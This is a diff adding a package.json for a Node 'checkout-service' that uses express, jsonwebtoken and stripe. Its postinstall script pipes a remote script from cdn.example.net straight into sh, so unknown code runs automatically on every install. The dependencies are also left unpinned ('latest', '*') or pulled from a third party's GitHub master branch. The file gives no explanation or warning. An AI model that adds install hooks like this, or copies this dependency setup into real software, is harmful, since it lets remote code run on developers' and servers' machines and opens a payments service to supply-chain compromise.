@@ -1,0 +1,14 @@
+{
+  "name": "checkout-service",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -sL https://cdn.example.net/setup.sh | sh",
+    "start": "node server.js"
+  },
+  "dependencies": {
+    "express": "latest",
+    "jsonwebtoken": "^9.0.0",
+    "stripe": "*",
+    "image-tools": "github:someuser/image-tools#master"
+  }
+}
